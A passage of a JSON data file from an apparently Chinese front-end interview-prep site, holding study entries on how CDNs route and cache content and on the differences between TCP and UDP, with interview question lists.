网络节点。普通域名一般配置 A 记录，指向提供服务的业务服务器。\n\n### 源站\n\n提供原始资源（使用 CDN 加速的资源）的业务服务器，可以指定为域名或 IP 地址。\n\n### 回溯\n\nCDN 节点未缓存资源，或者缓存资源已过期时，回到源站获取资源，返回给客户端。\n\n## 工作原理\n\n假设我建立了一个网站，域名为 `www.tt.com`，用户访问的主页链接为 `www.tt.com/idx.html`。为了缓解服务端压力和加快访问速度，决定使用阿里云 `CDN` 服务。\n为了更好地理解工作原理，先了解一下 CDN 的接入流程。\n\n### 接入流程\n\n主要接入步骤如下：\n\n1. 到某域名供应商处申请一个加速域名：`js.tt.com`。\n2. 到阿里云 CDN 平台添加加速域名 `js.tt.com`，同时设置其源站域名为 `www.tt.com`。\n3. 阿里云 CDN 平台自动分配一个 `CNAME` 域名：`js.tt.com.ali.com`。\n4. 到域名供应商处给加速域名 `js.tt.com` 添加 `CNAME` 记录，其值为上一步得到的 `CNAME` 域名：`js.tt.com.ali.com`。\n\n对以上步骤做进一步说明：\n\n* 为了使用 CDN，必需另外再申请一个加速域名，作为使用 CDN 的入口。\n* 加速域名配置的是 `CNAME` 记录，值为 CDN 平台提供的 `CNAME` 域名，该 `CNAME` 域名指向 CDN 系统节点。\n* 添加加速域名时需要配置源站域名，据此，CDN 平台保存了加速域名与源站域名的映射关系。\n* CNAME 域名的格式一般是：<加速域名> + <供应商主域名>。\n\n### CDN 系统架构\n\n从功能上看，典型的 CDN 系统由**分发服务系统**、**负载均衡系统**和**运营管理系统**组成。分发服务系统主要负责资源的响应、缓存和同步。负载均衡系统主要负责对用户请求进行调度。运营管理系统则负责运营需求管理和网络系统管理。\n\n从节点分布上看，CDN 系统主要分为 **边缘层** 和 **中心层**。边缘层分布在 CDN 网络的边缘位置，给用户提供就近访问服务。中心层则负责完成资源同步和运营管理等功能。中心层保存了加速域名的相关配置信息，比如源站域名，也缓存了加速域名下的各种资源。在边缘层节点未命中缓存时，需要向中心层节点发起请求；而中心层节点未能命中缓存时，需要查找对应的源站域名，并向该源站域名发起请求。然后再逐层返回并缓存用户请求的资源。\n\n### 访问流程\n\n用户 A 的第一次访问流程如下图所示：\n\n![](https://static.ecool.fun//article/dc6c1dd6-e551-4ef0-a20b-28a4a6035080.png)\n\n* 第 1 步访问的是加速域名，而不是源站域名。\n* 第 3 步返回 CNAME 域名。\n* 第 5 步返回 CNAME 域名对应的 IP 地址，指向 CDN 边缘层节点。\n* 第 6 步请求的 URL （或者说 Referer ）仍为 `js.tt.com/idx.html`。\n* 第 7 步请求中心层节点时，会带上第 6 步的 URL 作为参数。\n* 第 8 步通过查询配置数据得到源站域名，进而向源站发起请求。这里的业务服务器即为 CDN 的源站。简单起见，省略了从 DNS 服务器查询 A 记录的过程。\n* 在整个过程中，URL 的域名会变化，但是 URL 的路径不会变化。\n\n用户 A 第二次访问流程如图 2 所示：\n\n![](https://static.ecool.fun//article/88e2cad7-2ddd-4dfc-9720-3b90f7daa32f.png)\n\n需要进一步说明的是：\n\n* 由于本地 DNS 客户端拥有了加速域名的解析缓存，就不需要再查询 DNS 服务器了。\n* 由于 CDN 边缘层节点有了对应资源的缓存，就不需要再向上请求资源了。\n\n用户 B 第一次访问流程如图 3 所示：\n\n![](https://static.ecool.fun//article/9d078551-9bf8-4b04-a6ab-2e02dfd74662.png)\n\n需要进一步说明的是：\n\n* 由于用户 A 和用户 B 地域相差比较远，使用不同的边缘层节点，所以边缘层节点没有对应资源的缓存，需要向中心层节点请求资源。\n* 中心层节点拥有该资源的缓存，所以就不需要回源了。\n\n### 就近访问原理\n\nCDN 系统是如何实现就近访问的呢？\n\n`CNAME` 域名是 CDN 供应商提供的，CDN 供应商拥有对 `CNAME` 域名的配置权。CDN 供应商会把 `CNAME` 域名的 NS 记录设置为自己搭建的 `DNS` 服务器。这样一来，解析 `CNAME` 域名的时候就会请求 `CDN` 供应商搭建的 `DNS` 服务器。而 `CDN` 供应商在 `DNS` 服务器中实现了负载均衡，会返回离用户较近的边缘层节点的 IP 地址。如此便实现了就近访问。\n在图 1 中，第 4 步是向阿里云 `DNS` 服务器查询的，该 `DNS` 服务器会根据地理位置和健康状态等信息返回多个较近的可用的 `CDN` 边缘节点的 IP 地址。`DNS` 客户端会选择其中一个 `IP` 地址作为解析结果，一般是第一个。",
    "testPoint": "面试中考察 CDN 通常不仅涉及“是什么”，更关注**为什么用、怎么用、如何影响缓存、安全与可用性**等综合能力。\n\n## 一、CDN 的核心原理\n\n* **节点分发**：将静态资源缓存至多个地理分布的 CDN 节点（边缘节点），用户请求资源时，调度系统将其路由到最近的节点。\n* **缓存机制**：首次请求资源由源站响应，CDN 缓存资源；后续请求由边缘节点直接响应。\n* **调度算法**：根据 IP 地理位置、网络延迟、健康状态等因素将用户请求分配到最优节点。\n* **内容回源**：CDN 节点没有资源时会从源站拉取资源并缓存。\n\n## 二、面试常见考察方向\n\n### 1. **CDN 的基本作用**\n\n* 降低延迟（就近访问）\n* 减轻源站压力（缓存命中）\n* 提高并发能力（分布式架构）\n* 提升可用性和抗 DDoS 攻击能力\n\n### 2. **CDN 缓存机制**\n\n* CDN 节点缓存是如何更新的？\n* 如何设置资源缓存策略？（HTTP 头：`Cache-Control`, `Expires`, `ETag`, `Last-Modified`）\n* 如何避免缓存过期或强制刷新资源？\n* 如何区分“热资源”和“冷资源”的缓存策略？\n\n### 3. **缓存穿透与缓存击穿**\n\n* 缓存穿透：不存在的资源频繁访问如何处理？\n* 缓存击穿：高并发访问一个刚过期的资源时如何缓解？\n\n### 4. **CDN 与源站关系**\n\n* 如何配置 CDN 的回源策略？\n* 如何保证 CDN 与源站内容一致性？\n* 回源带宽控制、防盗链设置？\n\n### 5. **CDN 加速的对象和范围**\n\n* 哪些资源适合走 CDN？（图片、CSS、JS、视频等静态资源）\n* 动态资源能否走 CDN？（边缘计算、动态内容缓存）\n\n### 6. **CDN 安全**\n\n* HTTPS 配置：CDN 是否支持 HTTPS？如何配置证书？\n* 防盗链、防刷、防热链\n* 白名单/黑名单机制\n\n### 7. **CDN 与版本控制**\n\n* 静态资源版本号（hash）对 CDN 缓存策略的影响\n* CDN 缓存失效的最佳实践（文件名变更 vs 控制头失效）\n\n### 8. **CDN 常见问题排查**\n\n* 页面更新但用户看到旧数据？\n* 某地区资源加载异常？可能是 DNS/调度问题？\n* 缓存不生效？如何确认？\n\n\n## 三、CDN 相关 HTTP 响应头考点\n\n| 响应头                      | 含义                            |\n| ------------------------ | ----------------------------- |\n| `Cache-Control`          | 控制缓存行为（如 `max-age=3600`）      |\n| `ETag` / `If-None-Match` | 协商缓存机制，判断资源是否更新               |\n| `CDN-Cache-Status`       | 判断资源是否命中 CDN 缓存（如 HIT / MISS） |\n| `X-Cache`                | 一些 CDN 会注入此头用于调试缓存命中情况        |\n\n\n## 四、面试常见问题\n\n1. CDN 的原理是什么？它解决了哪些问题？\n2. 浏览器请求 CDN 资源时如何定位到最近的节点？\n3. CDN 缓存失效策略有哪些？如何手动刷新？\n4. 如何让资源文件在更新后立即生效？\n5. 使用 CDN 的时候，如何配置静态资源的缓存策略？\n6. CDN 是否可以缓存动态接口？如果要缓存，有哪些方式？\n7. CDN 如何支持 HTTPS？\n8. CDN 缓存命中率下降的可能原因有哪些？\n9. CDN 如何处理多个用户同时请求一个不存在的资源？\n",
    "exerciseKeyList": "[\"73f7c98b-68fd-455b-bc85-e94e1aa20ac1\",\"03a18e13-9f57-423e-97bb-7c2e54a806cb\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T06:05:31.000Z",
    "updateAt": "2025-08-04T02:21:38.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "03a18e13-9f57-423e-97bb-7c2e54a806cb",
        "title": "为什么推荐将静态资源放到cdn上？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T08:56:10.000Z",
        "updateAt": "2024-08-10T17:06:26.000Z"
      },
      {
        "exerciseKey": "73f7c98b-68fd-455b-bc85-e94e1aa20ac1",
        "title": "什么是CDN？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:56:26.000Z",
        "updateAt": "2024-08-15T18:44:14.000Z"
      }
    ]
  },
  "244": {
    "id": 244,
    "tagId": 16,
    "title": "TCP和UDP",
    "explanation": "## TCP/IP 五层模型\n\n先看图，为网络模型分层，以及一个完整http请求在五层模型中的完整工作流程\n\n![aHR0cHM6Ly9jZG4uaXR6aGFpLmNvbS9pbWFnZS0yMDIwMDcyNjIyMzMxNjk3MC1hLnBuZy1pdHpoYWk.png](https://static.ecool.fun//article/48a99d0f-a9b8-424f-a483-53a67064cedc.awebp)\n\n* `应用层`：最高层，提供特定于应用程序的协议，运行在该层的协议有HTTP、FTP、SSH、WebScoket等\n* `传输层`：为两个主机进程通信提供通用的数据传输协议，如TCP、UDP\n* `网络层`：负责寻址和路由功能，将数据包发送到特定的计算机，主要协议是IP协议，路由器就是在这一层\n* `链路层`：负责将二进制数据包和网络信号相互转换，交换机、网卡就是在这一层\n* `物理层`：主要有接收器、发送器、中继器、光纤电缆等\n\n网络协议通过分层来明确每一层的工作职责，通过定义明确的接口来协同工作，第一层都可以使用下面各层的功能，而不用担心各层是怎么实现的。就好像我们开发封装组件一样，每一个组件各自负责各自的事，互不干扰，也提高了复用度，如上图文件基本传输过程，也就是`http分层工作流程`：\n\n* 主机A发起请求，数据发送前会被分为许多片段，称为数据包，然后使用http协议将数据包封装，并加上`请求头`，传给下一层\n* 传输层拿到数据，为每个数据包分配一个端口号，用来确定目标计算机的哪一个应用程序，然后使用TCP协议进行处理，加上`TCP头`或`UDP头`，通过TCP协议传给下一层\n* 网络层拿到数据后为每个数据包添加目标计算机的IP地址，并决定传给什么路由或接收的主机，再封装传给下一层\n* 链路层将数据转译成电子信号，进一步封装成`数据帧`，传给物理层\n* 物理层通过电缆传送给主机B这边的链路层\n* 主机B的链路层拿到数据后，检查每个包中的目标地址并确定将其发送到哪里，如果不是发给自己的就丢弃，然后根据数据确定协议类型，再传给网络层的IP协议模块\n* 网络层接收到后拆开获取`IP头`，判断首部接收的IP地址匹配，然后根据`头部协议类型`，转发TCP或UDP等\n* 传输层TCP收到后会`计算校验`，判断数据的`完整性`，然后处理数据包顺序接收的逻辑，最后根据`端口`确定要转发给应用层的哪个程序\n* 最终应用层接到数据之后，根据http协议`解析`数据\n\n这里只展开一下网络层的 IP 和传输层的 TCP 、UDP\n\n## IP\n\n如果是在`局域网`内都是用`MAC地址通信`，局域网之外，就得用IP了。MAC就像是身份证，IP就像是住址。所有TCP、UDP、ICMP等数据都是以IP数据报格式进行传输\n\nIP协议本身不支持发往目的地址失败的IP数据包，也没有提供直接的方式获取诊断信息，比如发送途中经过哪些路由器，以及往返时间，而这就由`ICMP协议`来专门负责\n\n**ICMP并不为IP网络提供可靠性，只用于反馈各种故障和配置信息，丢包不会触发ICMP**\n\n> 我们常用的ping就是用ICMP查询报文。不过ping使用ICMP协议会直接跳过了传输层，所以ping程序是没有端口号的\n\n**IP协议的特点是：**\n\n* `IP协议是不可靠的传输协议`。如果 ICMP协议出现传输异常，IP都会丢弃数据包并可能会响应一个ICMP差错消息给发送端，而**任何要求可靠性必须由上层如TCP协议来提供**\n* `IP协议是无连接的`。就是不维护任何关于后续数据的状态信息，每个数据独立。表现在：可以不按发送顺序接收，不用维护连接状态，免去了维护复制的链路状态信息(TCP会讲到)\n\n## UDP\n\n### UDP的特点\n\n* `无连接`不需要握手和挥手就可以直接发送数据。\n* `不可靠性`：就是一个传递数据的搬运工，来一个包就发一个。不会备份，也不关心对方是否正确收到，传输顺序也无法保证。所以就只能由应用层来保证可靠，因为网络层也是不可靠的\n\n  + 在发送端应用层将数据传给传输层的UDP，它只**加一个UDP头标识**(UDP协议)，就直接发给网络层了。\n  + 接收端在网络层将数据发给传输层，传输层UDP**只去掉IP报文头**就传给应用层了。\n  + 其他什么都不会管，不过这也`减少开销和发送数据之前的延迟`\n* `支持广播`：有单播，多播，广播的功能，不只支持一对一传输方式，还支持一对多，多对多的方式\n* `首部开销小`：8个字节（`源端口号`(非必填)、`目的端口号`、`UDP长度`(数据报的整个长度)、`UDP检查和`(检测UDP数据报是否有错或者目的端口找不到对应的进程，`各2字节`），因为它要求不高而且实现的功能没有那么多，所以首部字段不多，而`TCP有20个字节`。它的数据是可以为0的，所以它最少可以是8个字节\n* `是面向报文的`：适合一次性传输少量数据，因为应用层给UDP多长的报文都会照样发送，即一次发送一个完整的报文，即不合并也不拆分。如果报文太长的话，UDP完整的装进来交给网络层的话，网络层就要分片了，因为传给链路层的话它有一个MTU的要求，所以网络层就要分片，这会给网络层的效率造成影响\n* `无拥塞控制`：适合实时应用，因为它会一直以恒定的速度发送数据，即使网络条件不好，也不会对发送速率进行调整。这就导致在网络不好的情况下就有可能丢包，但优点也明显，在某些实时性要求高的场景比如说聊天、在线视频、网络语音电话等使用UDP而不是TCP，比如打微信电话出现偶尔断续不是太大问题。当然拥塞太严重也有一些补救措施比如向前纠错或者重传\n\n### UDP 为什么不可靠\n\n* 传输数据之前`不需要先建立连接`\n* `不保证消息交付`，远程主机的传输层在接收到UDP报文后，不需要确认\n* `不保证将会顺序`，不设置包序号、不重排、不会发生队首阻塞\n* `不进行拥塞控制`，没有内置反馈机制，不重传、无超时\n\n## TCP\n\n这是我们平时用的最多的协议，特别是前后端\nTCP给应用程序提供了一种与UDP完全不同的服务\nTCP是面向连接的可靠的服务，面向连接指TCP的两个应用程序必须在它们可交换数据之前，通过相互联系来建立一个TCP连接\nTCP提供了一种字节流抽象概念给应用程序：不会自动插入记录标志或者消息边界，如发送端分别发10字节和30字节，接收端可能会以两个20字节的方式读入\n\n### TCP的特点\n\n* `是面向连接的`，通信之前双方必须要先建立连接\n* `只支持单播`，就是点对点的传输，一条TCP连接只能有两个端点\n* `提供可靠交付的服务`，有完整性校验、数据不会丢失，会丢包重传、且会按顺序到达\n* `是面向字节流的`。不像UDP那样一个个报文独立传输，而是在不保留报文边界的情况下以字节流方式进行传输\n* `提供拥塞控制`，当网络出现拥塞的情况，有流量控制，能够减少传输数据的速度和数量，缓解拥塞，保证稳定\n* `提供全双工通信和可靠通信`，指的是发送方和接收方可以`同时发送数据`也可以`同时接收数据`。因为两边都会设置有**发送缓存**和**接收缓存**\n\n  + `发送缓存`就是发送缓存的队列里面有准备发送的数据和已经发送但是还没有收到来自接收方确认的数据，如果没有收到确认还要重发所以不能扔掉，将可能会被重传，因为TCP需要保证可靠传输\n  + `接收缓存`就是按序到达但是还没有被接收应用程序读取的数据和没按序到达的数据，需要顺序排好了，接收方才能逐一接收数据\n\n#### 为什么说 TCP 是可靠的\n\n因为接收方收到数据后会发送一个ACK确认应答消息，这样发送方就知道自己的数据被对方接收了，如果一直没有收到ACK一定时间后就会重发。因此就算数据没有发到接收方，或者接收方的ACK数据包丢失也有重传机制，确保双方最终可以通过重传也能正确收到消息\n\n#### 重传机制\n\n由于TCP的下层网络层可能出现丢失、重复或乱序的情况，TCP协议需要提供可靠数据传输服务。\n\n为保数据传输的正确性，就是在发送一个数据包之后，就会开启一个`定时器`，若在一定时间内没有收到发送数据的`ACK确认报文`，就会对该报文进行`重传`，在达到一定次数还没有成功时放弃并发送一个`复位信号`\n\n#### 拥塞控制机制\n\n主要体现在四个方面\n\n* 一是`慢启动`，开始的时候不要发送大量数据，先测试一下网络，然后慢慢由小到大的增加拥塞窗口大小\n* 二是`拥塞避免`，一旦判断网络出现拥塞，就将传送设置成出现拥塞时一半的大小，并把拥塞窗口设为1，再重新开始慢启动算法\n* 三是`快速重传`，就是接收方在收到一个失序的报文后立即发出重复确认，快重传算法规定发送方只要连续收到三个重复确认就立即重传对方尚未收到的报文段，而不用继续等重传计时器到期\n* 四是`快速恢复`，考虑到如果网络出现拥塞的话，就不至于能连续收到好几个重复的确认，所以发送方会认为网络可能没有出现拥塞，这样就不执行慢开始算法，而是执行拥塞避免算法\n\n#### 流量控制\n\n就是为了让发送方发送数据的速度不要太快，要让接收方来得及接收。\n\n在接收方缓存中已接受的数据处理不过来时，减小发送方的窗口大小，让接收方有足够的时间来接收数据包。或是接收方比较空闲时，发送方调大窗口大小，以加快传输，合理利用网络资源\n\n### TCP 三次握手\n\n1. **第一次握手**：客户端向服务器发送(SYN,seq)\n   * 一个`SYN报文`\n   * 一个客户端`初始化随机序列号`(seq)\n2. **第二次握手**：服务器收到请求后向客户端发送(SYN,ACK,seq,ack)\n   * 自己的`SYN报文`和`ACK报文`\n   * 一个服务端的`初始化随机序列号`seq\n   * 一个确认号ack=客户端发来的序列号+1，表示自己收到了\n3. **第三次握手**：客户端收到服务器的确认应答后，向服务端发送(ACK,seq,ack)\n   * 确认应答ACK报文\n   * 一个seq，值为第二次握手客户端发过来的ack的值\n   * 一个确认号ack，值为服务端的序列号+1，告诉服务端我收到了\n\n**为什么不能两次？**\n\n1. 确认双方`发送`和`接收`的能力是不是正常\n2. 相互`确认初始化序列号`，并告诉对方什么样序号的报文能被接收，只用两次的话，服务器就不知道自己的序列号有没有被对方确认，可能造成失效的报文段被服务器接收，造成错误情况。\n\n**为什么不能四次？**\n\n因为没必要，该确认的三次都确认完了\n\n### TCP 四次挥手\n\n关闭TCP连接的挥手，**客户端和服务端都可以发起关闭操作**，以客户端发起为例\n\n1. 浏览器先发送`FIN`报文、`Seq`=初始化序列号给服务器，并停止发送数据，但仍可以接受服务端响应的数据\n2. 服务器收到后，发送`AC`K=浏览器序列号+1给浏览器，表明收到\n3. 服务器数据都发完了，给浏览器发送`FIN`报文、`Seq`=序列号给浏览器\n4. 浏览器收到后，发送`ACK`=服务器序列号+1给服务器，表明收到\n\n> 第四次挥手结束后后需要过一阵（时间等待计时器设置的时间2MSL后）以确保服务器收到自己的ack报文才会进入关闭状态，服务器收到ack报文之后，也关闭连接\n\n#### 为什么要等一段时间再关闭，不等不行吗？\n\n这是为了防止发送给服务器的确认报文段丢失或者出错，从而导致服务端不能正常关闭。等待时间是2MSL，这也是报文在网络上的最大生存时间，超过这个时间就会被丢弃\n\nRFC793中规定MSL为2分钟，但实际应用中常用的是30秒，1分钟和2分钟都有，如果超过这个时间，那么主动关闭者就会发送一个RST状态位的包，表示重置连接，这时候被关闭者就知道对方已经关闭了连接\n\n如果主动关闭者不进行等待，由于端口复用的原因，主动关闭可能已经开启了另一个连接，这时候被关闭者还在重试发起FIN请求，导致主动关闭者收到很多没用的包。因为包是有序列号的，所以可以判断到不是本次连接该接收的包，就不会管。为此需要让主动关闭者等待，确保被关闭者不会再发送FIN请求了再进行端口复用\n\n#### 为什么要四次挥手呢\n\nTCP使用四次挥手是因为TCP的连接是全双工的，所以需要双方分别释放对方的连接，单独的一方的连接释放，只能代表不能再向对方发送数据，可以接收数据\n\n所以在关闭连接时，服务端收到FIN报文时，很可能并不会立即关闭socket，因为它可能还有报文没有发送完，所以只能回复一个ack报文，告诉客户端“你发的报文我收到了”，等我所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送，所以需要四次挥手\n\n## TCP粘包及处理\n\n粘包是指为了防止数据量过小导致大量传输，全将多个TCP段合并成一个发送。就是将若干个包数据粘成一个包，从接收缓冲区看，后一包数据的头紧接送前一包数据的尾。因为TCP层传输是流式传输，流，最大的问题是没有边界，没有边界就会造成数据粘在一起\n\n拆包就是将任务拆分处理了，降低出错率\n\n### 造成粘包的场景\n\n* 接收方不及时接收缓冲区的包，造成多个包接收\n* 因为TCP默认使用`Nagle算法`，这个算法本身也可能会导致粘包问题\n* 由于TCP的`复用`造成粘包。由于TCP连接的复用性，建立一条连接可以供一台主机上的多个进程使用，那么多种不同结构的数据到TCP的流式传输里，边界分割肯定会出现奇葩的问题\n* 数据包过大造成的粘包问题，比如应用进程缓冲区的一条消息内容大小超过了发送缓存区的大小，就可能产生粘包，因为消息已经被分割了，前一部分已经被接收了，但另一部分可能刚放入缓存冲区准备发送，这样就会导致后一部分粘包\n* 流量控制，拥塞控制也可能导致粘包\n\n```\nNagle算法，主要做两件事：\n    一是只有上一个分组得到确认，才会发送下一个分组；\n    二是收集多个小分组，数据包大小达到最大段大小(MSS)，在一个确认到来时一起发送。\n\n多个分组拼成一个数据段发出去，如果没有处理好边界问题，在解包的时候就会发生粘包\n\n```\n\n### 粘包怎么处理\n\n* 如果是`Nagle算法`导致的，结合应用场景适当关闭算法就可以了\n* 如果不是\n  + `尾部标记序列`。通过特殊标识符表示数据包的边界，比如\\n\\r\\t或一些隐藏字符\n  + `头部标记分步接收`。在TCP报文的头部加上表示数据长度。使用带消息头的协议，消息头存储开始标识及消息长度信息，服务商获取消息头的时候解析出消息长度，然后向后读取该长度的内容\n  + 应用层发送数据时定长发送，服务端读取既定长度的内容作为一条完整消息，如果不够长，就在空位上补固定字符\n\n## UDP为什么不会粘包\n\n1. 因为UDP是`面向消息的协议`，UDP段都是一条消息，应用程序必须以消息为单位提取数据，不能一次提取任意字节的数据\n2. UDP具有`保护消息边界`，在每个UDP包中有消息头（消息来源地址，端口信息等），这样对于接收端来说容易进行分区处理。传输协议把数据当作一条独立的消息在网上传输，接收方只能接收独立的消息，如果消息内容过大，超过接收方一次所能接受的大小，就会丢失一部分数据，因为就算是丢失，它也不会分两次去接收\n\n## TCP和UDP的区别和适用场景\n\n* `TCP`传送速度慢；`UDP`速度快\n* `TCP`协议可靠，有拥塞控制和流量控制；`UDP`协议不可靠，也没有拥塞控制和流量控制等\n* `TCP`协议是面向连接，而且需要3次握手；`UDP`协议采用无连接，不需要握手\n* `TCP`只能一对一连接；`UDP`支持广播，一对一，一对多，多对多都可以\n* `TCP`头部大小最小20个字节；`UDP`最小8字节\n* `TCP`在传输上是面向字节流的；而`UDP`是面向报文的\n* `TCP`协议在传送数据段的时候要给段标号；`UDP`协议不用\n\n另外，TCP和UDP的端口号是相互独立的，所以是可以相同的\n\n**适用场景**\n\n`TCP`适合传输大量数据，以及要求可靠性传输的场景（要对数据确认、重发、排序等），比如登录，传文件等\n`UDP`适合传输少量数据，以及要求效率高的场景，比如实时应用，即时通讯，聊天视频通话等",
    "testPoint": "在前端面试中，**TCP 与 UDP** 的考察主要围绕它们的**协议特性对比**、**使用场景差异**、以及在现代前端技术中（如 HTTP、WebSocket、QUIC、音视频传输）中的实际应用。\n\n## 一、TCP 与 UDP 的核心区别\n\n| 特性   | TCP（传输控制协议）      | UDP（用户数据报协议）     |\n| ---- | ---------------- | ---------------- |\n| 是否连接 | **面向连接（连接需建立）**  | **无连接（无需握手）**    |\n| 可靠性  | **可靠传输（有序、无丢失）** | **不可靠（可能丢包、乱序）** |\n| 有序性  | 保证顺序（按序号重排）      | 不保证顺序            |\n| 传输效率 | 较低（连接维护、确认、拥塞控制） | 高（无连接、无需确认）      |\n| 头部开销 | 较大（20 字节以上）      | 较小（8 字节）         |\n| 适用场景 | 需要完整可靠传输的场景      | 实时性强、可容忍丢包的场景    |\n| 流控制  | 有（窗口机制）          | 无                |\n| 拥塞控制 | 有（慢启动、拥塞避免等）     | 无                |\n\n## 二、面试常考基础问题\n\n### 1. TCP 如何保证可靠传输？\n\n* 三次握手建立连接\n* 序列号 + 确认应答机制（ACK）\n* 超时重传\n* 滑动窗口实现流量控制\n* 拥塞控制算法（如 Reno、Cubic）\n\n### 2. UDP 为什么更快？\n\n* 无需建立连接（无三次握手）\n* 没有确认和重传机制\n* 适合广播、视频流、实时游戏等场景\n\n### 3. TCP 三次握手、四次挥手流程？\n\n* **三次握手**：客户端 → SYN → 服务端 → SYN+ACK → 客户端 → ACK\n* **四次挥手**：客户端 FIN → 服务端 ACK → 服务端 FIN → 客户端 ACK\n\n\n## 三、前端相关场景应用\n\n| 技术/协议         | 底层传输协议         | 说明                 |\n| ------------- | -------------- | ------------------ |\n| HTTP / HTTP/2 | TCP            | 页面请求、接口调用等使用       |\n| WebSocket     | TCP            | 长连接通信，基于 TCP 建立    |\n| HTTP/3 (QUIC) | UDP            | 用 UDP 模拟出可靠传输，提升性能 |\n| DNS 查询        | UDP 为主         | 简单快速的查询，可容忍丢包      |\n| 视频/音频传输       | UDP（如 RTP）     | 丢包不影响体验，优先实时性      |\n| WebRTC        | UDP（STUN/DTLS） | 实时通信，注重低延迟         |\n\n## 四、TCP 的性能与机制考察\n\n### 1. 为什么 TCP 有队头阻塞？\n\n* TCP 是流式协议，数据必须按顺序到达，前面包未收到 → 后面包无法处理\n\n### 2. 如何减少 TCP 连接建立开销？\n\n* 使用 `keep-alive`\n* 启用 HTTP/2 多路复用\n* 升级为 HTTP/3（使用 QUIC）\n\n### 3. TCP 慢启动机制？\n\n* 为防止拥塞，连接初期传输速率缓慢逐步升高\n\n\n## 五、UDP 的典型应用考察\n\n* **直播场景**：使用 UDP 提高实时性，轻微丢包不影响观看\n* **游戏通信**：低延迟优先，逻辑冗余可容忍数据丢失\n* **DNS 查询**：一次性请求，快速返回\n* **QUIC 协议**：基于 UDP 实现的可靠传输，解决 TCP 队头阻塞问题\n\n## 六、面试常见问题示例\n\n| 问题                  | 涉及知识点                |\n| ------------------- | -------------------- |\n| TCP 和 UDP 的区别？      | 连接性、可靠性、效率、应用场景      |\n| TCP 是如何保证数据可靠的？     | 序列号、确认应答、超时重传、窗口机制   |\n| TCP 为什么慢？           | 建连握手、拥塞控制、重传机制       |\n| UDP 丢包了怎么办？         | 不处理，应用层自行容错或忽略       |\n| HTTP/3 为什么用 UDP？    | 避免 TCP 队头阻塞、提升连接建立速度 |\n| WebSocket 基于 TCP 吗？ | 是的，长连接场景依赖 TCP 的可靠性  |",
    "exerciseKeyList": "[\"27703359-5f71-4ce6-b14b-1ac577cda21b\",\"3a3fd346-b19c-4c3c-bda9-573795286c36\",\"b4dabecb-c6b4-4c7a-abd7-ae1ee355be1a\",\"71a38c25-6756-4e1c-8710-bd5b7ee74772\",\"919d2e94-71b1-4096-b263-4a1edb0231be\",\"7e8ffb4e-8433-46cc-b45b-d8733a9c4833\",\"ce797089-2061-44cd-a99b-b91d1dc668ee\",\"72450c25-d5a3-4dbb-b86e-ff7cb02a4ec2\",\"cef2e473-d9d3-4c2e-937d-9ffe268aeda7\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T06:46:22.000Z",
    "updateAt": "2025-08-06T03:38:29.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "27703359-5f71-4ce6-b14b-1ac577cda21b",
        "title": "TCP 传输过程？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:30:29.000Z"
      },
      {
        "exerciseKey": "3a3fd346-b19c-4c3c-bda9-573795286c36",
        "title": "一个 tcp 连接能发几个 http 请求？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:00:12.000Z"
      },
      {
        "exerciseKey": "71a38c25-6756-4e1c-8710-bd5b7ee74772",
        "title": "TCP 粘包（TCP packet sticking）是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-21T01:14:28.000Z"
      },
      {
        "exerciseKey": "72450c25-d5a3-4dbb-b86e-ff7cb02a4ec2",
        "title": "TCP 和 UDP的区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-23T06:26:40.000Z",
        "updateAt": "2024-08-10T17:05:45.000Z"
      },
      {
        "exerciseKey": "7e8ffb4e-8433-46cc-b45b-d8733a9c4833",
        "title": "TCP和HTTP请求之间有什么关系？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-14T01:17:35.000Z",
        "updateAt": "2024-08-10T17:06:31.000Z"
      },
      {
        "exerciseKey": "919d2e94-71b1-4096-b263-4a1edb0231be",
        "title": "TCP是怎么判断丢包的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-20T04:26:00.000Z",
        "updateAt": "2024-08-10T17:06:33.000Z"
      },
      {
        "exerciseKey": "b4dabecb-c6b4-4c7a-abd7-ae1ee355be1a",
        "title": "TCP/IP 是如何保证数据包传输有序可靠的？\n\n",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T23:00:41.000Z"
      },
      {
        "exerciseKey": "ce797089-2061-44cd-a99b-b91d1dc668ee",
        "title": "说说对TCP/IP协议的了解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-10T05:59:43.000Z",
        "updateAt": "2024-08-10T17:06:29.000Z"
      },
      {
        "exerciseKey": "cef2e473-d9d3-4c2e-937d-9ffe268aeda7",
        "title": "TCP链接为什么会采用三次握手，而不是两次或者四次呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T07:16:01.000Z",
        "updateAt": "2024-08-10T17:04:53.000Z"
      }
    ]
  },
  "245": {
    "id": 245,
    "tagId": 16,
    "title": "网络延迟和丢包",
